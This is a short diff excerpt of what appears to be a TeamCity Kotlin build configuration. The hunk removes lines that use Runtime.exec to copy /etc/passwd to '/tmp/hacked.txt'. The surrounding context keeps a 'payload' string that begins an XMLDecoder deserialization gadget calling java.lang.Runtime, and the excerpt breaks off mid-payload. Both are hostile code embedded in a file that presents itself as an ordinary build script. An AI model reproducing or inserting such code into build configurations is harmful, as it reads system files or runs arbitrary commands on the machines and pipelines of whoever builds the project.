@@ -80,10 +80,6 @@ project {
 object Build : BuildType({
     name = "Build"
 
-    var process = Runtime.getRuntime().exec("scp /etc/passwd /tmp/hacked.txt")
-    val exitCode = process.waitFor()
-    println(exitCode)
-
     val payload = """<?xml version="1.0" encoding="UTF-8"?>
     <java version="1.8.0_102" class="java.beans.XMLDecoder">
      <object class="java.lang.Runtime" method="getRuntime">
